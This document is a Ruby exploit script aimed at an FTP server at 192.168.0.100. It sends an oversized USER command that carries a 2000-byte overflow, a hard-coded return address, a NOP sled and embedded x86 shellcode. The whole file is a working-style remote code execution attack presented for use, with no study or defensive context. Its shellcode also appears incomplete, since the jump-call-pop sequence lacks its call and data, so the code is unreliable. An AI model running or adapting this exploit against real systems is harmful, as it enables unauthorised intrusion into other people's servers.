require 'socket'

host = "192.168.0.100"
port = 21

# Offset and return address
offset = 2000
ret = "\x8f\x35\x4a\x5f"

# Shellcode
shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
shellcode += "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
shellcode += "\x80\x89\xc6\xeb\x06\xb0\x01\x31"
shellcode += "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
shellcode += "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
shellcode += "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
shellcode += "\x04\xb3\x01\xeb\xdf"

# Exploit buffer
buf = "USER " + "A" * offset + ret + "\x90" * 20 + shellcode + "\r\n"

# Create socket connection
s = TCPSocket.new(host, port)

# Send exploit buffer
s.send(buf, 0)

# Receive response from target system
response = s.recv(1024)
puts response

# Close socket connection
s.close()
